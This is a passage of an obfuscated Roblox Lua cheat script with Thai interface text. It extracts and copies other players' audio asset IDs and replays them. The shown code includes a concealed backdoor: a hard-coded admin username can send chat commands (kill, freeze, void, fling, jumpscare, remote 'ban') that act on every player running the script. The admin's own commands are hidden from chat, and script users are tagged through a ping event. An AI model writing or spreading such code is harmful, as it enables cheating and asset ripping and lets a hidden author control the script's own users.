														if (FlatIdent_2388 == 0) then
															seenIds[id] = true;
															table.insert(finalIds, id);
															break;
														end
													end
												end
											end
										end
										if (#finalIds == 0) then
											outputText = "❌ ดึงค่าแล้วไม่พบ ID เพลงจริงอยู่ข้างในเลย (โดนบล็อกทั้งหมด)";
										else
											local FlatIdent_8BC55 = 0;
											while true do
												if (FlatIdent_8BC55 == 0) then
													outputText = "--- พบบทเพลงเจาะสำเร็จทั้งหมด " .. #finalIds .. " ID ---\n\n";
													for idx, id in ipairs(finalIds) do
														outputText = outputText .. string.format("[%d] ID เจาะได้: %s\n", idx, id);
													end
													break;
												end
											end
										end
										break;
									end
									if (FlatIdent_82AB4 == 0) then
										finalIds = {};
										seenIds = {};
										FlatIdent_82AB4 = 1;
									end
								end
							end
							break;
						end
						if (FlatIdent_5B2CE == 0) then
							JunkTitle.Text = "INSTANT LOG VIEWER (ID เจาะสดเรียลไทม์)";
							jStroke.Color = Color3.fromRGB(0, 200, 100);
							FlatIdent_5B2CE = 1;
						end
					end
				end
			elseif (CurrentViewMode == 3) then
				local FlatIdent_76EB7 = 0;
				while true do
					if (1 == FlatIdent_76EB7) then
						JunkCopyBtn.BackgroundColor3 = Color3.fromRGB(180, 0, 255);
						outputText = [[👑 รายชื่อคำสั่งแชทแกล้งคน (พิมพ์ในช่องแชทได้เลย คนอื่นจะไม่เห็นข้อความ):

;check - เช็กคนรันสคริปต์ (ขึ้น Highlight สีเขียวบนหัว 2 วินาที)
;kill [ชื่อ] - ฆ่าผู้เล่น
;freeze [ชื่อ] - แช่แข็งผู้เล่น
;unfreeze [ชื่อ] - ปลดแช่แข็ง
;bring [ชื่อ] - ดึงผู้เล่นมาหาเรา
;tp [ชื่อ] - วาร์ปไปหาผู้เล่น
;void [ชื่อ] - ส่งผู้เล่นลงใต้แมพ (ตกโลก)
;fling [ชื่อ] - ดีดผู้เล่นให้กระเด็น
;jumpscare [ชื่อ] - หลอกผีผู้เล่น
;banscript [ชื่อ] - แบนออกจากสคริปต์ถาวร (ลบ UI ทิ้ง)]];
						break;
					end
					if (FlatIdent_76EB7 == 0) then
						JunkTitle.Text = "👑 ADMIN COMMANDS LIST (@" .. AdminUsername .. ")";
						jStroke.Color = Color3.fromRGB(180, 0, 255);
						FlatIdent_76EB7 = 1;
					end
				end
			end
			if (JunkTextLabel.Text ~= outputText) then
				JunkTextLabel.Text = outputText;
				local textBounds = TextService:GetTextSize(outputText, 11, Enum.Font.Code, Vector2.new(JunkScroll.AbsoluteSize.X - 15, math.huge));
				JunkTextLabel.Size = UDim2.new(1, -10, 0, textBounds.Y + 20);
				JunkScroll.CanvasSize = UDim2.new(0, 0, 0, textBounds.Y + 40);
			end
			break;
		end
	end
end
GetIDBtn.MouseButton1Click:Connect(function()
	if CurrentSelectedPlayer then
		local FlatIdent_19F98 = 0;
		local targetPlayer;
		local soundObjects;
		local finalIds;
		local seenIds;
		while true do
			if (FlatIdent_19F98 == 1) then
				soundObjects = checkPlayerAllSounds(targetPlayer);
				finalIds = {};
				FlatIdent_19F98 = 2;
			end
			if (FlatIdent_19F98 == 0) then
				StatusLabel.Text = "🔍 กำลังเจาะและบันทึก ID ทั้งหมด...";
				targetPlayer = Players:FindFirstChild(CurrentSelectedPlayer.Name);
				FlatIdent_19F98 = 1;
			end
			if (FlatIdent_19F98 == 2) then
				seenIds = {};
				for _, soundObj in ipairs(soundObjects) do
					local rawId = soundObj.SoundId or "";
					local decoded = deepDecode(rawId);
					local searchText = ((decoded ~= "") and decoded) or rawId;
					local extractedIds = extractIDsFromPattern(searchText);
					if (#extractedIds == 0) then
						for num in string.gmatch(searchText, "%d+") do
							if not BlockedIDs[num] then
								table.insert(extractedIds, num);
							end
						end
					end
					for _, id in ipairs(extractedIds) do
						if not seenIds[id] then
							local FlatIdent_69486 = 0;
							while true do
								if (FlatIdent_69486 == 0) then
									seenIds[id] = true;
									table.insert(finalIds, id);
									break;
								end
							end
						end
					end
				end
				FlatIdent_19F98 = 3;
			end
			if (FlatIdent_19F98 == 3) then
				if (#finalIds > 0) then
					local FlatIdent_6D9D2 = 0;
					while true do
						if (FlatIdent_6D9D2 == 0) then
							copyToClipboard(table.concat(finalIds, " "));
							StatusLabel.Text = "📋 คัดลอก " .. #finalIds .. " ID เรียบร้อย!";
							break;
						end
					end
				else
					StatusLabel.Text = "❌ ไม่พบ ID ที่ใช้ได้";
				end
				break;
			end
		end
	else
		StatusLabel.Text = "⚠️ โปรดเลือกชื่อผู้เล่นก่อนกดดึง!";
	end
end);
GetJunkBtn.MouseButton1Click:Connect(function()
	if CurrentSelectedPlayer then
		local FlatIdent_4CEEC = 0;
		local targetPlayer;
		local soundObjects;
		local firstCleanId;
		while true do
			if (FlatIdent_4CEEC == 2) then
				for _, soundObj in ipairs(soundObjects) do
					local rawId = soundObj.SoundId or "";
					local cleanId = string.gsub(rawId, "^rbxassetid://", "");
					if string.find(cleanId, "rbxassetid://") then
						cleanId = string.match(cleanId, "rbxassetid://(%d+)") or cleanId;
					end
					if (not BlockedIDs[cleanId] and (cleanId ~= "")) then
						firstCleanId = cleanId;
						break;
					end
				end
				if (firstCleanId and playMusicFromId(firstCleanId)) then
					StatusLabel.Text = "✅ เปิดเพลงสำเร็จ: " .. firstCleanId;
				else
					StatusLabel.Text = "❌ เล่นเพลงไม่สำเร็จ หรือโดนบล็อก";
				end
				break;
			end
			if (FlatIdent_4CEEC == 1) then
				soundObjects = checkPlayerAllSounds(targetPlayer);
				firstCleanId = nil;
				FlatIdent_4CEEC = 2;
			end
			if (FlatIdent_4CEEC == 0) then
				StatusLabel.Text = "🎵 กำลังยิงคำสั่งเปิดเพลงตามขยะ...";
				targetPlayer = Players:FindFirstChild(CurrentSelectedPlayer.Name);
				FlatIdent_4CEEC = 1;
			end
		end
	else
		StatusLabel.Text = "⚠️ โปรดเลือกชื่อผู้เล่นก่อนเปิดเพลง!";
	end
end);
ViewRawJunkBtn.MouseButton1Click:Connect(function()
	if CurrentSelectedPlayer then
		local FlatIdent_5EE26 = 0;
		while true do
			if (FlatIdent_5EE26 == 1) then
				updateJunkViewerLive();
				StatusLabel.Text = "👁️ เปิดหน้าต่างแสดงขยะ RAW เรียลไทม์แล้ว";
				break;
			end
			if (FlatIdent_5EE26 == 0) then
				CurrentViewMode = 1;
				JunkFrame.Visible = true;
				FlatIdent_5EE26 = 1;
			end
		end
	else
		StatusLabel.Text = "⚠️ โปรดเลือกชื่อผู้เล่นก่อนกดดูขยะดิบ!";
	end
end);
ViewInstantBtn.MouseButton1Click:Connect(function()
	if CurrentSelectedPlayer then
		local FlatIdent_FA88 = 0;
		while true do
			if (FlatIdent_FA88 == 0) then
				CurrentViewMode = 2;
				JunkFrame.Visible = true;
				FlatIdent_FA88 = 1;
			end
			if (FlatIdent_FA88 == 1) then
				updateJunkViewerLive();
				StatusLabel.Text = "🔍 เปิดหน้าต่างสแกน ID เจาะสด Real-time";
				break;
			end
		end
	else
		StatusLabel.Text = "⚠️ โปรดเลือกชื่อผู้เล่นก่อนกดดู ID เจาะสด!";
	end
end);
if AdminCmdBtn then
	AdminCmdBtn.MouseButton1Click:Connect(function()
		local FlatIdent_1CA5D = 0;
		while true do
			if (FlatIdent_1CA5D == 0) then
				CurrentViewMode = 3;
				JunkFrame.Visible = true;
				FlatIdent_1CA5D = 1;
			end
			if (FlatIdent_1CA5D == 1) then
				updateJunkViewerLive();
				StatusLabel.Text = "👑 เปิดหน้าต่างคำสั่ง ADMIN เรียบร้อยแล้ว";
				break;
			end
		end
	end);
end
JunkCopyBtn.MouseButton1Click:Connect(function()
	if ((JunkTextLabel.Text ~= "ไม่มีข้อมูล...") and not string.find(JunkTextLabel.Text, "❌")) then
		local FlatIdent_67517 = 0;
		while true do
			if (FlatIdent_67517 == 0) then
				copyToClipboard(JunkTextLabel.Text);
				StatusLabel.Text = "📋 คัดลอกเนื้อหาทั้งหมดเรียบร้อย!";
				break;
			end
		end
	end
end);
JunkBackBtn.MouseButton1Click:Connect(function()
	local FlatIdent_628E3 = 0;
	while true do
		if (FlatIdent_628E3 == 0) then
			JunkFrame.Visible = false;
			StatusLabel.Text = "⬅️ กลับสู่แผงควบคุมหลักแนวนอนแล้ว";
			break;
		end
	end
end);
RefreshBtn.MouseButton1Click:Connect(refreshPlayers);
Players.PlayerAdded:Connect(refreshPlayers);
Players.PlayerRemoving:Connect(function(p)
	local FlatIdent_2E34E = 0;
	while true do
		if (FlatIdent_2E34E == 0) then
			if (CurrentSelectedPlayer == p) then
				local FlatIdent_2A9F7 = 0;
				while true do
					if (FlatIdent_2A9F7 == 0) then
						CurrentSelectedPlayer = nil;
						StatusLabel.Text = "โปรดเลือกผู้เล่น...";
						break;
					end
				end
			end
			refreshPlayers();
			break;
		end
	end
end);
ToggleBtn.MouseButton1Click:Connect(function()
	MainFrame.Visible = not MainFrame.Visible;
	if not MainFrame.Visible then
		JunkFrame.Visible = false;
	else
		refreshPlayers();
	end
end);
task.spawn(function()
	while true do
		local FlatIdent_91B54 = 0;
		while true do
			if (FlatIdent_91B54 == 0) then
				task.wait(1.5);
				if MainFrame.Visible then
					pcall(function()
						local FlatIdent_6679B = 0;
						while true do
							if (FlatIdent_6679B == 0) then
								refreshPlayers();
								if JunkFrame.Visible then
									updateJunkViewerLive();
								end
								break;
							end
						end
					end);
				end
				break;
			end
		end
	end
end);
refreshPlayers();
local TrackerEvent = ReplicatedStorage:FindFirstChild("HonScriptTrackerEvent");
if not TrackerEvent then
	local FlatIdent_63AE4 = 0;
	while true do
		if (1 == FlatIdent_63AE4) then
			TrackerEvent.Parent = ReplicatedStorage;
			break;
		end
		if (FlatIdent_63AE4 == 0) then
			TrackerEvent = Instance.new("BindableEvent");
			TrackerEvent.Name = "HonScriptTrackerEvent";
			FlatIdent_63AE4 = 1;
		end
	end
end
local function ShowVisualEffect(targetPlayer)
	local FlatIdent_31ECC = 0;
	local char;
	local head;
	local highlight;
	local billboard;
	local label;
	while true do
		if (9 == FlatIdent_31ECC) then
			label.Parent = billboard;
			task.delay(2, function()
				local FlatIdent_58C0A = 0;
				local tweenInfo;
				local t1;
				local t2;
				while true do
					if (FlatIdent_58C0A == 1) then
						t2 = TweenService:Create(label, tweenInfo, {TextTransparency=1,TextStrokeTransparency=1});
						t1:Play();
						FlatIdent_58C0A = 2;
					end
					if (2 == FlatIdent_58C0A) then
						t2:Play();
						t1.Completed:Connect(function()
							local FlatIdent_94AF7 = 0;
							while true do
								if (FlatIdent_94AF7 == 0) then
									highlight:Destroy();
									billboard:Destroy();
									break;
								end
							end
						end);
						break;
					end
					if (FlatIdent_58C0A == 0) then
						tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out);
						t1 = TweenService:Create(highlight, tweenInfo, {FillTransparency=1,OutlineTransparency=1});
						FlatIdent_58C0A = 1;
					end
				end
			end);
			break;
		end
		if (4 == FlatIdent_31ECC) then
			billboard = Instance.new("BillboardGui");
			billboard.Name = "ScriptUserTag";
			billboard.Size = UDim2.new(0, 200, 0, 50);
			FlatIdent_31ECC = 5;
		end
		if (FlatIdent_31ECC == 2) then
			highlight.FillColor = Color3.fromRGB(0, 255, 100);
			highlight.OutlineColor = Color3.fromRGB(255, 255, 255);
			highlight.FillTransparency = 0.3;
			FlatIdent_31ECC = 3;
		end
		if (7 == FlatIdent_31ECC) then
			label.Text = "🟢 RUNNING SCRIPT: " .. targetPlayer.Name;
			label.TextColor3 = Color3.fromRGB(0, 255, 120);
			label.TextStrokeColor3 = Color3.fromRGB(0, 0, 0);
			FlatIdent_31ECC = 8;
		end
		if (FlatIdent_31ECC == 0) then
			if (not targetPlayer or not targetPlayer.Character) then
				return;
			end
			char = targetPlayer.Character;
			head = char:FindFirstChild("Head") or char.PrimaryPart;
			FlatIdent_31ECC = 1;
		end
		if (5 == FlatIdent_31ECC) then
			billboard.StudsOffset = Vector3.new(0, 3, 0);
			billboard.AlwaysOnTop = true;
			billboard.Parent = head;
			FlatIdent_31ECC = 6;
		end
		if (FlatIdent_31ECC == 6) then
			label = Instance.new("TextLabel");
			label.Size = UDim2.new(1, 0, 1, 0);
			label.BackgroundTransparency = 1;
			FlatIdent_31ECC = 7;
		end
		if (FlatIdent_31ECC == 1) then
			if not head then
				return;
			end
			highlight = Instance.new("Highlight");
			highlight.Name = "ScriptUserHighlight";
			FlatIdent_31ECC = 2;
		end
		if (FlatIdent_31ECC == 3) then
			highlight.OutlineTransparency = 0;
			highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop;
			highlight.Parent = char;
			FlatIdent_31ECC = 4;
		end
		if (FlatIdent_31ECC == 8) then
			label.TextStrokeTransparency = 0;
			label.Font = Enum.Font.FredokaOne;
			label.TextSize = 18;
			FlatIdent_31ECC = 9;
		end
	end
end
TrackerEvent.Event:Connect(function(action, senderName)
	if ((action == "PingCheck") and (senderName ~= LocalPlayer.Name)) then
		TrackerEvent:Fire("PongResponse", LocalPlayer.Name, senderName);
	elseif ((action == "PongResponse") and senderName) then
		local FlatIdent_7126B = 0;
		local p;
		while true do
			if (0 == FlatIdent_7126B) then
				p = Players:FindFirstChild(senderName);
				if p then
					ShowVisualEffect(p);
				end
				break;
			end
		end
	end
end);
local function PingAllUsers()
	local FlatIdent_D6BD = 0;
	while true do
		if (FlatIdent_D6BD == 0) then
			ShowVisualEffect(LocalPlayer);
			for _, p in ipairs(Players:GetPlayers()) do
				if (p ~= LocalPlayer) then
					pcall(function()
						TrackerEvent:Fire("PingCheck", LocalPlayer.Name);
					end);
				end
			end
			break;
		end
	end
end
local function ExecuteAdminCommand(cmd, targetArg)
	local FlatIdent_4E551 = 0;
	local targetPlayer;
	while true do
		if (FlatIdent_4E551 == 0) then
			targetPlayer = findTargetPlayer(targetArg);
			if (cmd == "banscript") then
				local FlatIdent_7517F = 0;
				while true do
					if (0 == FlatIdent_7517F) then
						if targetPlayer then
							local FlatIdent_43BEE = 0;
							while true do
								if (FlatIdent_43BEE == 1) then
									StatusLabel.Text = "🚫 แบน " .. targetPlayer.Name .. " ออกจากสคริปต์เรียบร้อย!";
									break;
								end
								if (0 == FlatIdent_43BEE) then
									BannedFromScript[targetPlayer.UserId] = true;
									BannedFromScript[targetPlayer.Name:lower()] = true;
									FlatIdent_43BEE = 1;
								end
							end
						end
						return;
					end
				end
			end
			FlatIdent_4E551 = 1;
		end
		if (FlatIdent_4E551 == 1) then
			if (targetPlayer and (targetPlayer == LocalPlayer)) then
				local char = LocalPlayer.Character;
				local hum = char and char:FindFirstChildOfClass("Humanoid");
				local hrp = char and char:FindFirstChild("HumanoidRootPart");
				if (cmd == "kill") then
					if hum then
						hum.Health = 0;
					end
				elseif (cmd == "freeze") then
					if hrp then
						hrp.Anchored = true;
					end
				elseif (cmd == "unfreeze") then
					if hrp then
						hrp.Anchored = false;
					end
				elseif (cmd == "bring") then
					local FlatIdent_2FBBD = 0;
					local adminPlayer;
					while true do
						if (0 == FlatIdent_2FBBD) then
							adminPlayer = Players:FindFirstChild(AdminUsername);
							if (adminPlayer and adminPlayer.Character and adminPlayer.Character:FindFirstChild("HumanoidRootPart") and hrp) then
								hrp.CFrame = adminPlayer.Character.HumanoidRootPart.CFrame;
							end
							break;
						end
					end
				elseif (cmd == "tp") then
				elseif (cmd == "void") then
					if hrp then
						hrp.CFrame = hrp.CFrame * CFrame.new(0, -500, 0);
					end
				elseif (cmd == "fling") then
					if hrp then
						local FlatIdent_90113 = 0;
						local bfv;
						while true do
							if (FlatIdent_90113 == 0) then
								bfv = Instance.new("BodyVelocity", hrp);
								bfv.MaxForce = Vector3.new(1000000000, 1000000000, 1000000000);
								FlatIdent_90113 = 1;
							end
							if (FlatIdent_90113 == 1) then
								bfv.Velocity = Vector3.new(math.random(-500, 500), 1000, math.random(-500, 500));
								task.delay(0.5, function()
									bfv:Destroy();
								end);
								break;
							end
						end
					end
				elseif (cmd == "jumpscare") then
					local FlatIdent_624DF = 0;
					local jScreen;
					local img;
					while true do
						if (FlatIdent_624DF == 2) then
							img.Image = "rbxassetid://6022802879";
							task.delay(1.5, function()
								jScreen:Destroy();
							end);
							break;
						end
						if (FlatIdent_624DF == 1) then
							img = Instance.new("ImageLabel", jScreen);
							img.Size = UDim2.new(1, 0, 1, 0);
							FlatIdent_624DF = 2;
						end
						if (FlatIdent_624DF == 0) then
							jScreen = Instance.new("ScreenGui", PlayerGui);
							jScreen.Name = "JumpscareUI";
							FlatIdent_624DF = 1;
						end
					end
				end
			end
			break;
		end
	end
end
local function ProcessChatMessage(message, senderPlayer)
	if not message then
		return false;
	end
	local cleanMsg = string.match(message, "^%s*(.-)%s*$") or message;
	if ((string.lower(cleanMsg) == ";check") and (senderPlayer == LocalPlayer)) then
		local FlatIdent_5B0A0 = 0;
		while true do
			if (FlatIdent_5B0A0 == 0) then
				PingAllUsers();
				return true;
			end
		end
	end
	if (cleanMsg:sub(1, 1) == ";") then
		local FlatIdent_B1F4 = 0;
		local args;
		local cmd;
		local targetName;
		while true do
			if (FlatIdent_B1F4 == 1) then
				targetName = args[2];
				if ((cmd == "banscript") and (senderPlayer.Name:lower() == AdminUsername:lower()) and targetName) then
					local FlatIdent_5202D = 0;
					local targetPlayer;
					while true do
						if (0 == FlatIdent_5202D) then
							targetPlayer = findTargetPlayer(targetName);
							if (targetPlayer and (targetPlayer == LocalPlayer)) then
								local FlatIdent_9128B = 0;
								while true do
									if (FlatIdent_9128B == 0) then
										ScreenGui:Destroy();
										return true;
									end
								end
							end
							break;
						end
					end
				end
				FlatIdent_B1F4 = 2;
			end
			if (FlatIdent_B1F4 == 0) then
				args = string.split(cleanMsg:sub(2), " ");
				cmd = args[1] and args[1]:lower();
				FlatIdent_B1F4 = 1;
			end
			if (FlatIdent_B1F4 == 2) then
				if (senderPlayer.Name:lower() == AdminUsername:lower()) then
					local FlatIdent_580B8 = 0;
					while true do
						if (FlatIdent_580B8 == 0) then
							ExecuteAdminCommand(cmd, targetName);
							return true;
						end
					end
				end
				break;
			end
		end
	end
	return false;
end
pcall(function()
	if (TextChatService.ChatVersion == Enum.ChatVersion.TextChatService) then
		TextChatService.OnIncomingMessage = function(message)
			if message.TextSource then
				local FlatIdent_3BEFE = 0;
				local sender;
				while true do
					if (0 == FlatIdent_3BEFE) then
						sender = Players:GetPlayerByUserId(message.TextSource.UserId);
						if (sender and ProcessChatMessage(message.Text, sender) and (sender == LocalPlayer)) then
							message.Text = "";
						end
						break;
					end
				end
			end
		end;
	end
end);
pcall(function()
	local FlatIdent_C595 = 0;
	while true do
		if (FlatIdent_C595 == 0) then
			for _, p in ipairs(Players:GetPlayers()) do
				p.Chatted:Connect(function(msg)
					ProcessChatMessage(msg, p);
				end);
			end
			Players.PlayerAdded:Connect(function(p)
				p.Chatted:Connect(function(msg)
					ProcessChatMessage(msg, p);
				end);
			end);
			break;
		end
	end
end);
if (BannedFromScript[LocalPlayer.UserId] or BannedFromScript[LocalPlayer.Name:lower()]) then
	ScreenGui:Destroy();
end